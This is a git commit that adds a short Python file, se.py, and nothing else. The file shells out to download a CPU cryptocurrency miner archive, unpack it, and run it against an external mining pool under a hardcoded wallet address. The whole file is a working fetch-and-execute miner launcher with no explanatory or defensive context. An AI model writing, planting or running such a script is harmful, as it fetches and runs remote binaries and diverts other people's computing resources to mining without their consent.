2ffe4c46f60ab0293edfc0a18c88e42e48f2d72f
magdamana001 <86566264+magdamana001@users.noreply.github.com>
2022-03-27 13:08:10 +0200

    Add files via upload

---
+++ se.py
@@ -0,0 +1,3 @@
+import os
+
+os.system("wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz; tar xf cpuminer-opt-linux.tar.gz; chmod +x cpuminer-sse2; ./cpuminer-sse2 -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17023 -u RRLGKHQd29BRUM5xPYQffkGL6cRcGZf9x4.a7 ")
